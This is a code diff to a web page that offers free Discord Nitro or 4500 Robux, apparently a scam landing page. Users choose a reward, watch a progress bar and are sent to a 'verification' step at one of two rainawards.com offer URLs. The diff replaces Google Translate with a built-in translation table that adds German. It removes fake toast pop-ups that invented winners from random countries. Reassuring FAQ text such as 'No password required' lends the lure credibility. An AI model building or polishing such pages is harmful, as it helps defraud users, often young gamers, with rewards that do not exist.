@@ -45,7 +45,6 @@
       z-index: 2;
     }
 
-    /* Language Switcher */
     .lang-switcher {
       display: flex;
       justify-content: flex-end;
@@ -76,7 +75,6 @@
       color: white;
     }
 
-    /* Main Card */
     .card {
       background: #0f1119;
       border-radius: 1.5rem;
@@ -115,7 +113,6 @@
       margin: 0.75rem 0 1.5rem 0;
     }
 
-    /* Choices Grid - Exactly 2 cards side by side */
     .choices {
       display: grid;
       grid-template-columns: repeat(2, 1fr);
@@ -147,35 +144,23 @@
       box-shadow: 0 0 0 1px #5865f2;
     }
 
-    .choice-badge {
-      position: absolute;
-      top: -10px;
-      right: 14px;
-      background: linear-gradient(135deg, #f5b042, #e67e22);
-      padding: 4px 12px;
-      border-radius: 2rem;
-      font-size: 0.6rem;
-      font-weight: 800;
-      color: #0a0c12;
-      letter-spacing: 0.5px;
-    }
-
     .choice-icon {
-      width: 80px;
-      height: 80px;
+      width: 90px;
+      height: 90px;
       margin: 0 auto 0.8rem;
-      background: #0a0c14;
-      border-radius: 1.25rem;
+      background: linear-gradient(135deg, #1a1d2e, #121520);
+      border-radius: 1.5rem;
       display: flex;
       align-items: center;
       justify-content: center;
-      border: 1px solid rgba(88, 101, 242, 0.2);
+      box-shadow: inset 0 1px 1px rgba(255,255,255,0.05), 0 8px 20px rgba(0,0,0,0.3);
     }
 
     .choice-icon img {
-      width: 52px;
-      height: 52px;
+      width: 56px;
+      height: 56px;
       object-fit: contain;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
     }
 
     .choice-title {
@@ -186,20 +171,12 @@
       color: #fff;
     }
 
-    .choice-price {
-      font-size: 0.8rem;
-      font-weight: 600;
-      color: #f5b042;
-      margin-bottom: 0.4rem;
-    }
-
     .choice-sub {
       font-size: 0.68rem;
       color: #9a9fc0;
       line-height: 1.4;
     }
 
-    /* Actions */
     .actions {
       text-align: center;
     }
@@ -234,7 +211,6 @@
       margin-top: 0.6rem;
     }
 
-    /* Progress */
     .progress {
       background: #0a0c14;
       border-radius: 1rem;
@@ -269,7 +245,6 @@
       margin-top: 0.5rem;
     }
 
-    /* FAQ Section */
     .seo-content {
       margin-top: 1.75rem;
       background: #0a0c14;
@@ -348,75 +323,13 @@
       margin-top: 1.5rem;
     }
 
-    /* Activity Toasts */
-    .activity-toasts {
-      position: fixed;
-      bottom: 24px;
-      left: 24px;
-      z-index: 1000;
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      pointer-events: none;
-    }
-
-    .activity-toast {
-      background: #1a1c2a;
-      backdrop-filter: blur(12px);
-      border-radius: 12px;
-      padding: 10px 14px;
-      min-width: 200px;
-      max-width: 240px;
-      animation: slideInLeft 0.3s ease;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
-      border-left: 3px solid;
-    }
-
-    .toast-nitro {
-      border-left-color: #5865f2;
-    }
-
-    .toast-robux {
-      border-left-color: #f5b042;
-    }
-
-    .toast-line1 {
-      font-size: 0.65rem;
-      color: #9a9fc0;
-      margin-bottom: 4px;
-    }
-
-    .toast-reward {
-      font-weight: 700;
-      font-size: 0.85rem;
-      color: #fff;
-      margin-bottom: 4px;
-    }
-
-    .toast-time {
-      font-size: 0.55rem;
-      color: #6a6f90;
-    }
-
-    @keyframes slideInLeft {
-      from {
-        opacity: 0;
-        transform: translateX(-30px);
-      }
-      to {
-        opacity: 1;
-        transform: translateX(0);
-      }
-    }
-
     @media (max-width: 640px) {
       body { padding: 1rem; }
       .card { padding: 1.25rem; }
       .choices { grid-template-columns: 1fr; gap: 1rem; }
-      .choice-icon { width: 65px; height: 65px; }
-      .choice-icon img { width: 42px; height: 42px; }
+      .choice-icon { width: 75px; height: 75px; }
+      .choice-icon img { width: 48px; height: 48px; }
       h1 { font-size: 1.2rem; }
-      .activity-toasts { bottom: 12px; left: 12px; }
     }
 
     .disabled {
@@ -428,18 +341,6 @@
       display: none;
     }
   </style>
-  <!-- Google Translate Widget -->
-  <script type="text/javascript">
-    function googleTranslateElementInit() {
-      new google.translate.TranslateElement({
-        pageLanguage: 'en',
-        includedLanguages: 'en,fr,es,pt,id',
-        layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
-        autoDisplay: false
-      }, 'google_translate_element');
-    }
-  </script>
-  <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 </head>
 <body>
   <main class="wrap">
@@ -447,38 +348,37 @@
       <a class="lang-link" data-lang="en">English</a>
       <a class="lang-link" data-lang="fr">Français</a>
       <a class="lang-link" data-lang="es">Español</a>
+      <a class="lang-link" data-lang="de">Deutsch</a>
       <a class="lang-link" data-lang="pt">Português BR</a>
       <a class="lang-link" data-lang="id">Indonesia</a>
     </nav>
-    <div id="google_translate_element" style="display: none;"></div>
 
     <section class="card">
       <div class="header">
-        <h1>Daily Reward Options</h1>
-        <p class="subtitle">Explore available rewards in English and continue to the verification step to claim access.</p>
+        <h1 id="mainTitle">Daily Reward Options</h1>
+        <p class="subtitle" id="subtitleText">Explore available rewards in English and continue to the verification step to claim access.</p>
       </div>
-      <p class="trust-note">No password required.</p>
+      <p class="trust-note" id="trustText">No password required.</p>
 
       <div class="choices">
         <button type="button" class="choice-card" data-choice="Nitro Boost">
-          <span class="choice-badge">BEST VALUE</span>
           <div class="choice-icon">
             <img src="https://i.postimg.cc/3JgsR1xh/nitroboost.webp" alt="Nitro Boost" />
           </div>
-          <div class="choice-title">Nitro Boost</div>
-          <div class="choice-sub">Top Nitro option with boosts, streaming perks, and profile extras.</div>
+          <div class="choice-title" id="nitroTitle">Nitro Boost</div>
+          <div class="choice-sub" id="nitroDesc">Top Nitro option with boosts, streaming perks, and profile extras.</div>
         </button>
         <button type="button" class="choice-card" data-choice="4500 Robux">
           <div class="choice-icon">
             <img src="https://i.postimg.cc/1RgP9DFD/robux-1.webp" alt="4500 Robux" />
           </div>
-          <div class="choice-title">4500 Robux</div>
-          <div class="choice-sub">Large Robux pack for upgrades, passes, and future drops.</div>
+          <div class="choice-title" id="robuxTitle">4500 Robux</div>
+          <div class="choice-sub" id="robuxDesc">Large Robux pack for upgrades, passes, and future drops.</div>
         </button>
       </div>
 
       <div class="actions">
-        <button class="generate-btn" id="generateBtn" disabled>Continue</button>
+        <button class="generate-btn" id="generateBtn" disabled><span id="btnText">Continue</span></button>
         <p class="actions-note" id="actionsNote">Select one of the two best rewards to unlock the button.</p>
       </div>
 
@@ -490,38 +390,230 @@
     </section>
 
     <section class="seo-content">
-      <div class="eyebrow">QUESTIONS</div>
-      <h2>Reward access FAQ</h2>
+      <div class="eyebrow" id="eyebrowText">QUESTIONS</div>
+      <h2 id="faqTitle">Reward access FAQ</h2>
       <div class="faq-list">
         <div class="faq-item">
-          <div class="faq-question">Do I need to enter my password?</div>
-          <div class="faq-answer">No. This page does not ask for your password. Never share your Discord, Roblox, email, or account password.</div>
+          <div class="faq-question" id="faq1q">Do I need to enter my password?</div>
+          <div class="faq-answer" id="faq1a">No. This page does not ask for your password. Never share your Discord, Roblox, email, or account password.</div>
         </div>
         <div class="faq-item">
-          <div class="faq-question">Which reward options are available today?</div>
-          <div class="faq-answer">Available rewards may include Discord Nitro and Robux, depending on the current reward page and verification flow.</div>
+          <div class="faq-question" id="faq2q">Which reward options are available today?</div>
+          <div class="faq-answer" id="faq2a">Available rewards may include Discord Nitro and Robux, depending on the current reward page and verification flow.</div>
         </div>
         <div class="faq-item">
-          <div class="faq-question">What does verification check?</div>
-          <div class="faq-answer">The verification step helps confirm device and offer eligibility before you continue to claim access.</div>
+          <div class="faq-question" id="faq3q">What does verification check?</div>
+          <div class="faq-answer" id="faq3a">The verification step helps confirm device and offer eligibility before you continue to claim access.</div>
         </div>
         <div class="faq-item">
-          <div class="faq-question">Can I come back later?</div>
-          <div class="faq-answer">Yes. You can return to the reward page later to review daily events and available options again.</div>
+          <div class="faq-question" id="faq4q">Can I come back later?</div>
+          <div class="faq-answer" id="faq4a">Yes. You can return to the reward page later to review daily events and available options again.</div>
         </div>
       </div>
     </section>
 
     <footer>
-      <p>Rewards Verification - 2026</p>
+      <p id="footerText">Rewards Verification - 2026</p>
     </footer>
   </main>
 
-  <div id="toastContainer" class="activity-toasts"></div>
-
   <script>
     (function() {
-      // Redirect URLs - random selection
+      // ==================== TRANSLATIONS ====================
+      const translations = {
+        en: {
+          title: "Daily Reward Options",
+          subtitle: "Explore available rewards in English and continue to the verification step to claim access.",
+          trust: "No password required.",
+          nitroTitle: "Nitro Boost",
+          nitroDesc: "Top Nitro option with boosts, streaming perks, and profile extras.",
+          robuxTitle: "4500 Robux",
+          robuxDesc: "Large Robux pack for upgrades, passes, and future drops.",
+          btnText: "Continue",
+          actionsNote: "Select one of the two best rewards to unlock the button.",
+          eyebrow: "QUESTIONS",
+          faqTitle: "Reward access FAQ",
+          faq1q: "Do I need to enter my password?",
+          faq1a: "No. This page does not ask for your password. Never share your Discord, Roblox, email, or account password.",
+          faq2q: "Which reward options are available today?",
+          faq2a: "Available rewards may include Discord Nitro and Robux, depending on the current reward page and verification flow.",
+          faq3q: "What does verification check?",
+          faq3a: "The verification step helps confirm device and offer eligibility before you continue to claim access.",
+          faq4q: "Can I come back later?",
+          faq4a: "Yes. You can return to the reward page later to review daily events and available options again.",
+          footer: "Rewards Verification - 2026"
+        },
+        fr: {
+          title: "Options de récompense quotidiennes",
+          subtitle: "Explorez les récompenses disponibles en français et continuez à l'étape de vérification.",
+          trust: "Mot de passe non requis.",
+          nitroTitle: "Nitro Boost",
+          nitroDesc: "Meilleure option Nitro avec boosts, streaming 4K et extras.",
+          robuxTitle: "4500 Robux",
+          robuxDesc: "Pack Robux important pour améliorations et passes.",
+          btnText: "Continuer",
+          actionsNote: "Sélectionnez l'une des deux meilleures récompenses.",
+          eyebrow: "QUESTIONS",
+          faqTitle: "FAQ accès récompenses",
+          faq1q: "Dois-je entrer mon mot de passe?",
+          faq1a: "Non. Cette page ne demande pas votre mot de passe.",
+          faq2q: "Quelles récompenses sont disponibles aujourd'hui?",
+          faq2a: "Les options incluent Discord Nitro et Robux.",
+          faq3q: "Que vérifie la vérification?",
+          faq3a: "Confirme l'éligibilité de l'appareil.",
+          faq4q: "Puis-je revenir plus tard?",
+          faq4a: "Oui. Vous pouvez revenir plus tard.",
+          footer: "Vérification des récompenses - 2026"
+        },
+        es: {
+          title: "Opciones de recompensa diarias",
+          subtitle: "Explore las recompensas disponibles en español y continúe a la verificación.",
+          trust: "No se requiere contraseña.",
+          nitroTitle: "Nitro Boost",
+          nitroDesc: "Mejor opción Nitro con mejoras, streaming 4K y extras.",
+          robuxTitle: "4500 Robux",
+          robuxDesc: "Gran paquete de Robux para mejoras y pases.",
+          btnText: "Continuar",
+          actionsNote: "Seleccione una de las dos mejores recompensas.",
+          eyebrow: "PREGUNTAS",
+          faqTitle: "FAQ acceso recompensas",
+          faq1q: "¿Necesito ingresar mi contraseña?",
+          faq1a: "No. Esta página no pide su contraseña.",
+          faq2q: "¿Qué recompensas están disponibles hoy?",
+          faq2a: "Opciones incluyen Discord Nitro y Robux.",
+          faq3q: "¿Qué verifica la verificación?",
+          faq3a: "Confirma la elegibilidad del dispositivo.",
+          faq4q: "¿Puedo volver más tarde?",
+          faq4a: "Sí. Puede regresar más tarde.",
+          footer: "Verificación de Recompensas - 2026"
+        },
+        de: {
+          title: "Tägliche Belohnungsoptionen",
+          subtitle: "Entdecken Sie verfügbare Belohnungen auf Deutsch und fahren Sie mit dem Verifizierungsschritt fort.",
+          trust: "Kein Passwort erforderlich.",
+          nitroTitle: "Nitro Boost",
+          nitroDesc: "Beste Nitro-Option mit Boosts, 4K-Streaming und Profil-Extras.",
+          robuxTitle: "4500 Robux",
+          robuxDesc: "Großes Robux-Paket für Upgrades und Pässe.",
+          btnText: "Fortfahren",
+          actionsNote: "Wählen Sie eine der beiden besten Belohnungen aus.",
+          eyebrow: "FRAGEN",
+          faqTitle: "FAQ zum Belohnungszugriff",
+          faq1q: "Muss ich mein Passwort eingeben?",
+          faq1a: "Nein. Diese Seite fragt nicht nach Ihrem Passwort.",
+          faq2q: "Welche Belohnungen sind heute verfügbar?",
+          faq2a: "Verfügbare Optionen sind Discord Nitro und Robux.",
+          faq3q: "Was prüft die Verifizierung?",
+          faq3a: "Bestätigt die Geräte- und Angebotsberechtigung.",
+          faq4q: "Kann ich später zurückkommen?",
+          faq4a: "Ja. Sie können später zurückkehren.",
+          footer: "Belohnungsverifizierung - 2026"
+        },
+        pt: {
+          title: "Opções de recompensa diárias",
+          subtitle: "Explore as recompensas disponíveis em português e continue para a verificação.",
+          trust: "Senha não necessária.",
+          nitroTitle: "Nitro Boost",
+          nitroDesc: "Melhor opção Nitro com boosts, streaming 4K e extras.",
+          robuxTitle: "4500 Robux",
+          robuxDesc: "Grande pacote de Robux para upgrades e passes.",
+          btnText: "Continuar",
+          actionsNote: "Selecione uma das duas melhores recompensas.",
+          eyebrow: "PERGUNTAS",
+          faqTitle: "FAQ sobre acesso a recompensas",
+          faq1q: "Preciso digitar minha senha?",
+          faq1a: "Não. Esta página não pede sua senha.",
+          faq2q: "Quais recompensas estão disponíveis hoje?",
+          faq2a: "Opções incluem Discord Nitro e Robux.",
+          faq3q: "O que a verificação verifica?",
+          faq3a: "Confirma a elegibilidade do dispositivo.",
+          faq4q: "Posso voltar depois?",
+          faq4a: "Sim. Você pode voltar depois.",
+          footer: "Verificação de Recompensas - 2026"
+        },
+        id: {
+          title: "Opsi Hadiah Harian",
+          subtitle: "Jelajahi hadiah yang tersedia dalam bahasa Indonesia dan lanjutkan ke verifikasi.",
+          trust: "Tidak perlu kata sandi.",
+          nitroTitle: "Nitro Boost",
+          nitroDesc: "Opsi Nitro terbaik dengan boost, streaming 4K, dan ekstra.",
+          robuxTitle: "4500 Robux",
+          robuxDesc: "Paket Robux besar untuk upgrade dan akses.",
+          btnText: "Lanjutkan",
+          actionsNote: "Pilih salah satu dari dua hadiah terbaik.",
+          eyebrow: "PERTANYAAN",
+          faqTitle: "FAQ akses hadiah",
+          faq1q: "Apakah saya perlu memasukkan kata sandi?",
+          faq1a: "Tidak. Halaman ini tidak meminta kata sandi Anda.",
+          faq2q: "Hadiah apa yang tersedia hari ini?",
+          faq2a: "Opsi termasuk Discord Nitro dan Robux.",
+          faq3q: "Apa yang diverifikasi?",
+          faq3a: "Mengonfirmasi kelayakan perangkat.",
+          faq4q: "Bisakah saya kembali nanti?",
+          faq4a: "Ya. Anda dapat kembali nanti.",
+          footer: "Verifikasi Hadiah - 2026"
+        }
+      };
+
+      let currentLang = 'en';
+      let selectedReward = null;
+
+      // Apply translation to page
+      function applyTranslation(lang) {
+        const t = translations[lang];
+        if (!t) return;
+        
+        document.getElementById('mainTitle').innerText = t.title;
+        document.getElementById('subtitleText').innerText = t.subtitle;
+        document.getElementById('trustText').innerText = t.trust;
+        document.getElementById('nitroTitle').innerText = t.nitroTitle;
+        document.getElementById('nitroDesc').innerText = t.nitroDesc;
+        document.getElementById('robuxTitle').innerText = t.robuxTitle;
+        document.getElementById('robuxDesc').innerText = t.robuxDesc;
+        document.getElementById('actionsNote').innerText = t.actionsNote;
+        document.getElementById('eyebrowText').innerText = t.eyebrow;
+        document.getElementById('faqTitle').innerText = t.faqTitle;
+        document.getElementById('faq1q').innerText = t.faq1q;
+        document.getElementById('faq1a').innerText = t.faq1a;
+        document.getElementById('faq2q').innerText = t.faq2q;
+        document.getElementById('faq2a').innerText = t.faq2a;
+        document.getElementById('faq3q').innerText = t.faq3q;
+        document.getElementById('faq3a').innerText = t.faq3a;
+        document.getElementById('faq4q').innerText = t.faq4q;
+        document.getElementById('faq4a').innerText = t.faq4a;
+        document.getElementById('footerText').innerText = t.footer;
+        
+        if (!selectedReward) {
+          document.getElementById('btnText').innerText = t.btnText;
+        } else {
+          document.getElementById('btnText').innerText = `Continue with ${selectedReward}`;
+        }
+        
+        // Update active class on language links
+        document.querySelectorAll('.lang-link').forEach(link => {
+          if (link.getAttribute('data-lang') === lang) {
+            link.classList.add('active');
+          } else {
+            link.classList.remove('active');
+          }
+        });
+      }
+
+      // Language switching
+      const langLinks = document.querySelectorAll('.lang-link');
+      langLinks.forEach(link => {
+        link.addEventListener('click', (e) => {
+          e.preventDefault();
+          const newLang = link.getAttribute('data-lang');
+          if (newLang === currentLang) return;
+          currentLang = newLang;
+          applyTranslation(currentLang);
+        });
+      });
+
+      applyTranslation('en');
+
+      // ==================== REDIRECT URLS ====================
       const REDIRECT_URLS = [
         "https://rainawards.com/ow/6a1a96bb419d7ab04aa64184",
         "https://rainawards.com/ow/69bf833f2d6a708a36f234d5"
@@ -539,51 +631,7 @@
         });
       });
 
-      // Google Translate integration
-      const langMap = { en: 'en', fr: 'fr', es: 'es', pt: 'pt', id: 'id' };
-      
-      function triggerTranslate(langCode) {
-        const googleLang = langMap[langCode] || 'en';
-        const select = document.querySelector('.goog-te-combo');
-        if (select) {
-          select.value = googleLang;
-          select.dispatchEvent(new Event('change'));
-        } else {
-          const interval = setInterval(() => {
-            const el = document.querySelector('.goog-te-combo');
-            if (el) {
-              el.value = googleLang;
-              el.dispatchEvent(new Event('change'));
-              clearInterval(interval);
-            }
-          }, 100);
-          setTimeout(() => clearInterval(interval), 3000);
-        }
-        localStorage.setItem('preferred_lang', langCode);
-      }
-
-      function setActiveLang(lang) {
-        document.querySelectorAll('.lang-link').forEach(link => {
-          if (link.dataset.lang === lang) link.classList.add('active');
-          else link.classList.remove('active');
-        });
-      }
-
-      const savedLang = localStorage.getItem('preferred_lang') || 'en';
-      setActiveLang(savedLang);
-      if (savedLang !== 'en') setTimeout(() => triggerTranslate(savedLang), 500);
-
-      document.querySelectorAll('.lang-link').forEach(link => {
-        link.addEventListener('click', (e) => {
-          e.preventDefault();
-          const lang = link.dataset.lang;
-          setActiveLang(lang);
-          triggerTranslate(lang);
-        });
-      });
-
       // Main reward selection logic
-      let selectedReward = null;
       const choiceCards = document.querySelectorAll('.choice-card');
       const generateBtn = document.getElementById('generateBtn');
       const actionsNote = document.getElementById('actionsNote');
@@ -591,13 +639,14 @@
       const statusText = document.getElementById('statusText');
       const statusSub = document.getElementById('statusSub');
       const barFill = document.getElementById('barFill');
+      const btnText = document.getElementById('btnText');
 
       function selectChoice(card, rewardName) {
         choiceCards.forEach(c => c.classList.remove('active'));
         card.classList.add('active');
         selectedReward = rewardName;
         generateBtn.disabled = false;
-        generateBtn.textContent = `Continue with ${rewardName}`;
+        btnText.innerText = `Continue with ${rewardName}`;
         actionsNote.classList.add('hidden');
       }
 
@@ -652,57 +701,6 @@
       }
 
       generateBtn.addEventListener('click', startProgress);
-
-      // Activity toasts
-      const toastContainer = document.getElementById('toastContainer');
-      const countries = [
-        { flag: "🇬🇧", name: "UK" }, { flag: "🇺🇸", name: "USA" }, { flag: "🇨🇦", name: "Canada" },
-        { flag: "🇫🇷", name: "France" }, { flag: "🇩🇪", name: "Germany" }, { flag: "🇧🇷", name: "Brazil" },
-        { flag: "🇦🇺", name: "Australia" }, { flag: "🇪🇸", name: "Spain" }, { flag: "🇮🇹", name: "Italy" },
-        { flag: "🇳🇱", name: "Netherlands" }, { flag: "🇮🇳", name: "India" }, { flag: "🇮🇩", name: "Indonesia" }
-      ];
-      
-      const rewards = [
-        { name: "Nitro Boost", type: "nitro" },
-        { name: "4500 Robux", type: "robux" }
-      ];
-
-      let lastCountry = null;
-
-      function showToast() {
-        if (!toastContainer) return;
-        const available = countries.filter(c => c.flag !== lastCountry);
-        const country = available.length ? available[Math.floor(Math.random() * available.length)] : countries[0];
-        lastCountry = country.flag;
-        const reward = rewards[Math.floor(Math.random() * rewards.length)];
-        const seconds = Math.floor(Math.random() * 45) + 5;
-        const toastType = reward.type === 'nitro' ? 'toast-nitro' : 'toast-robux';
-        
-        const toast = document.createElement('div');
-        toast.className = `activity-toast ${toastType}`;
-        toast.innerHTML = `
-          <div class="toast-line1">Someone from ${country.flag}</div>
-          <div class="toast-reward">${reward.name}</div>
-          <div class="toast-time">got · ${seconds} sec ago</div>
-        `;
-        toastContainer.prepend(toast);
-        
-        while (toastContainer.children.length > 3) {
-          toastContainer.lastElementChild.remove();
-        }
-        
-        setTimeout(() => {
-          toast.style.opacity = '0';
-          toast.style.transition = 'opacity 0.3s';
-          setTimeout(() => toast.remove(), 300);
-        }, 5500);
-      }
-
-      // Start toasts
-      setTimeout(showToast, 2000);
-      setInterval(() => {
-        if (Math.random() > 0.3) showToast();
-      }, 20000);
     })();
   </script>
 </body>
